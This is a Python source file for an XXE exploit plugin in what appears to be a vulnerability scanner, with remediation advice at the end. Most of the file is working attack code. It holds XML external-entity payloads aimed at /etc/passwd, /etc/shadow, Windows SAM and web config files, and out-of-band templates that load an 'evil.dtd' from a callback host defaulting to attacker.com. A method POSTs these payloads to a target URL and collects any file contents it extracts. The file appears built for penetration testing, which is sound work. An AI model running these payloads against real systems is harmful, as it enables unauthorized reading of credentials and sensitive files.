"""
XXE (XML External Entity) Exploit Plugin

This plugin provides exploit capabilities for XXE vulnerabilities including:
- File extraction via XXE
- Out-of-band (OOB) XXE exploitation  
- Blind XXE techniques
- DTD-based attacks
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging
import re

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available")

try:
    from scanner.visual_proof_capture import VisualProofCapture
    from scanner.media_manager import MediaManager
    HAS_VISUAL_PROOF = True
except ImportError:
    HAS_VISUAL_PROOF = False
    logging.warning("Visual proof modules not available")

logger = logging.getLogger(__name__)


class XXEPlugin(ExploitPlugin):
    """
    XXE exploit plugin.
    
    This plugin provides XXE exploitation capabilities including:
    - Local file extraction
    - Out-of-band XXE attacks
    - Blind XXE exploitation
    - DTD-based exploitation
    """
    
    # Files to extract via XXE
    TARGET_FILES = {
        'linux': [
            '/etc/passwd',
            '/etc/hosts',
            '/etc/group',
            '/etc/shadow',
            '/proc/self/environ',
            '/var/www/html/config.php',
            '/var/www/html/wp-config.php',
        ],
        'windows': [
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\win.ini',
            'C:\\boot.ini',
            'C:\\Windows\\System32\\config\\SAM',
        ]
    }
    
    # XXE payload templates
    XXE_TEMPLATES = {
        'file_read': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>''',
        
        'parameter_entity': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % dtd SYSTEM "http://{callback_server}/evil.dtd">
%dtd;
]>
<root>&xxe;</root>''',
        
        'base64': '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={file_path}">
<!ENTITY % dtd SYSTEM "http://{callback_server}/evil.dtd">
%dtd;
]>
<root>&xxe;</root>''',
    }
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'xxe'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'XXE Exploit'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return (
            'XML External Entity exploit plugin for extracting files and '
            'performing out-of-band attacks via XML parsing vulnerabilities.'
        )
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate XXE payloads based on context.
        
        Args:
            context: Optional context containing:
                    - target_file: File to extract (e.g., /etc/passwd)
                    - target_os: Target operating system (linux, windows)
                    - callback_server: Out-of-band callback server
        
        Returns:
            List of XXE payload strings
        """
        context = context or {}
        target_file = context.get('target_file', '/etc/passwd')
        callback_server = context.get('callback_server', 'attacker.com')
        
        payloads = []
        
        # Generate file read payloads
        payloads.append(self.XXE_TEMPLATES['file_read'].format(file_path=target_file))
        
        # Generate parameter entity payloads
        if callback_server != 'attacker.com':
            payloads.append(self.XXE_TEMPLATES['parameter_entity'].format(
                file_path=target_file,
                callback_server=callback_server
            ))
        
        # Generate base64 encoded payloads (for PHP)
        payloads.append(self.XXE_TEMPLATES['base64'].format(
            file_path=target_file,
            callback_server=callback_server
        ))
        
        return payloads
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute XXE exploit attack.
        
        Args:
            target_url: The target URL to attack
            vulnerability_data: Dictionary containing vulnerability information
            config: Optional configuration dictionary
        
        Returns:
            Dict containing:
                - success: Boolean indicating if attack succeeded
                - extracted_files: Dict of successfully extracted files
                - evidence: Evidence of successful exploitation
                - error: Error message if attack failed
        """
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'xxe',
            }
        
        config = config or {}
        
        logger.info(f"Attempting XXE exploitation on {target_url}")
        
        # Try to extract files
        exploitation_result = self._attempt_file_extraction(target_url, config)
        
        if exploitation_result['success']:
            logger.info(f"Successfully exploited XXE on {target_url}")
            
            result = {
                'success': True,
                'extracted_files': exploitation_result.get('files', {}),
                'evidence': exploitation_result.get('evidence', ''),
                'vulnerability_type': 'xxe',
                'message': f'Successfully extracted {len(exploitation_result.get("files", {}))} file(s)',
            }
            
            # Capture visual proof if available
            if HAS_VISUAL_PROOF and config.get('capture_visual_proof', True):
                visual_proofs = self._capture_visual_proof(target_url, exploitation_result, config)
                if visual_proofs:
                    result['visual_proofs'] = visual_proofs
                    logger.info(f"Captured {len(visual_proofs)} visual proof(s)")
            
            return result
        else:
            logger.info(f"XXE exploitation attempt failed on {target_url}")
            return {
                'success': False,
                'error': exploitation_result.get('error', 'Could not extract files'),
                'message': 'XXE exploitation attempt was unsuccessful',
                'vulnerability_type': 'xxe',
            }
    
    def _attempt_file_extraction(self, url: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt to extract files via XXE.
        
        Returns:
            Dict with success status and extracted files
        """
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        extracted_files = {}
        
        headers = {'Content-Type': 'application/xml'}
        
        # Try Linux files
        logger.info("Attempting to extract Linux files...")
        for target_file in self.TARGET_FILES['linux'][:4]:  # Try first 4
            result = self._try_extract_file(url, target_file, headers, verify_ssl, timeout)
            if result['success']:
                extracted_files[target_file] = result['content']
                logger.info(f"Successfully extracted: {target_file}")
        
        # Try Windows files
        logger.info("Attempting to extract Windows files...")
        for target_file in self.TARGET_FILES['windows'][:2]:  # Try first 2
            result = self._try_extract_file(url, target_file, headers, verify_ssl, timeout)
            if result['success']:
                extracted_files[target_file] = result['content']
                logger.info(f"Successfully extracted: {target_file}")
        
        if extracted_files:
            return {
                'success': True,
                'files': extracted_files,
                'evidence': f'Extracted {len(extracted_files)} file(s): {", ".join(extracted_files.keys())}'
            }
        else:
            return {
                'success': False,
                'error': 'Could not extract any files via XXE'
            }
    
    def _try_extract_file(self, url: str, target_file: str, headers: Dict,
                         verify_ssl: bool, timeout: int) -> Dict[str, Any]:
        """
        Try to extract a specific file via XXE.
        
        Returns:
            Dict with success status and file content
        """
        # Generate payload
        payload = self.XXE_TEMPLATES['file_read'].format(file_path=target_file)
        
        try:
            response = requests.post(
                url,
                data=payload,
                headers=headers,
                timeout=timeout,
                verify=verify_ssl
            )
            
            # Check if file content is in response
            if self._verify_file_content(response.text, target_file):
                return {
                    'success': True,
                    'content': response.text[:1000],  # First 1000 chars
                }
        
        except Exception as e:
            logger.debug(f"Error extracting {target_file}: {e}")
        
        return {
            'success': False,
            'error': f'Could not extract {target_file}'
        }
    
    def _verify_file_content(self, content: str, target_file: str) -> bool:
        """Verify if the content contains expected file signatures."""
        # passwd file
        if 'passwd' in target_file:
            return bool(re.search(r'root:.*:0:0', content) or 
                       re.search(r'daemon:', content))
        
        # hosts file
        if 'hosts' in target_file.lower():
            return bool(re.search(r'127\.0\.0\.1', content) or
                       'localhost' in content.lower())
        
        # win.ini
        if 'win.ini' in target_file:
            return bool('[fonts]' in content.lower() or 
                       '[extensions]' in content.lower())
        
        # shadow file
        if 'shadow' in target_file:
            return bool('$' in content and ':' in content)
        
        # Generic check - if response contains XML-like data with file content
        if len(content) > 10 and not content.startswith('<!DOCTYPE html'):
            return True
        
        return False
    
    def _capture_visual_proof(self, url: str, exploitation_result: Dict[str, Any],
                               config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Capture visual proof of XXE exploitation.
        
        Args:
            url: Target URL
            exploitation_result: Results from exploitation attempt
            config: Configuration dictionary
            
        Returns:
            List of visual proof metadata dictionaries
        """
        visual_proofs = []
        
        try:
            proof_capture = VisualProofCapture()
            extracted_files = exploitation_result.get('files', {})
            
            # Capture screenshot of successful file extraction
            if extracted_files:
                # Build XXE payload for first extracted file
                first_file = list(extracted_files.keys())[0]
                payload = self.XXE_TEMPLATES['file_read'].format(file_path=first_file)
                
                # For visual proof, we need to show the response containing the extracted content
                # Create an HTML page to display the payload and response
                try:
                    import tempfile
                    import urllib.parse
                    
                    # Create a temporary HTML file showing the XXE exploitation
                    content_preview = extracted_files[first_file][:500]  # First 500 chars
                    html_content = f"""
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>XXE Exploitation Proof</title>
                        <style>
                            body {{ font-family: monospace; padding: 20px; background: #1e1e1e; color: #d4d4d4; }}
                            h1 {{ color: #4ec9b0; }}
                            h2 {{ color: #dcdcaa; }}
                            .payload {{ background: #252526; padding: 15px; border-left: 3px solid #007acc; margin: 15px 0; }}
                            .response {{ background: #252526; padding: 15px; border-left: 3px solid #4ec9b0; margin: 15px 0; }}
                            .success {{ color: #4ec9b0; font-weight: bold; }}
                            pre {{ white-space: pre-wrap; word-wrap: break-word; }}
                        </style>
                    </head>
                    <body>
                        <h1>XXE Exploitation - Visual Proof</h1>
                        <p class="success">âœ“ Successfully extracted file via XML External Entity injection</p>
                        
                        <h2>Target URL:</h2>
                        <p>{url}</p>
                        
                        <h2>Extracted File:</h2>
                        <p>{first_file}</p>
                        
                        <h2>XXE Payload:</h2>
                        <div class="payload">
                            <pre>{payload}</pre>
                        </div>
                        
                        <h2>Extracted Content (First 500 chars):</h2>
                        <div class="response">
                            <pre>{content_preview}</pre>
                        </div>
                        
                        <h2>Exploitation Details:</h2>
                        <p>The XXE vulnerability allowed extraction of {len(extracted_files)} file(s) by injecting external entity definitions into XML payloads.</p>
                    </body>
                    </html>
                    """
                    
                    # Write to temporary file
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False) as f:
                        f.write(html_content)
                        temp_file_path = f.name
                    
                    # Capture screenshot of the proof page
                    file_url = f"file://{temp_file_path}"
                    screenshot_data = proof_capture.capture_screenshot(
                        file_url,
                        wait_time=1.0
                    )
                    
                    # Clean up temp file
                    try:
                        os.unlink(temp_file_path)
                    except:
                        pass
                    
                    if screenshot_data:
                        visual_proofs.append({
                            'type': 'screenshot',
                            'data': screenshot_data,
                            'title': f'XXE - Extracted {first_file}',
                            'description': f'Successfully extracted file {first_file} using XML External Entity injection',
                            'exploit_step': f'File extraction via XXE payload',
                            'payload': payload
                        })
                        
                except Exception as e:
                    logger.debug(f"Error creating visual proof HTML: {e}")
            
        except Exception as e:
            logger.error(f"Failed to capture visual proof: {e}")
        
        return visual_proofs
    
    def get_severity_level(self) -> str:
        """Return the typical severity level for XXE vulnerabilities."""
        return 'critical'
    
    def get_remediation_advice(self) -> str:
        """Return remediation advice for XXE vulnerabilities."""
        return (
            'Prevent XXE attacks:\n'
            '1. Disable XML external entity processing in all XML parsers\n'
            '2. Use safe XML parsers with XXE disabled by default\n'
            '3. Disable DTD processing if not required\n'
            '4. Use JSON instead of XML where possible\n'
            '5. Keep XML processors and libraries updated\n'
            '6. Implement strict input validation and sanitization\n'
            '7. Use less complex data formats when XML is not required\n'
            '8. Implement network egress filtering\n'
            '9. Use XML security libraries and validators\n'
            '10. Apply principle of least privilege to file access'
        )
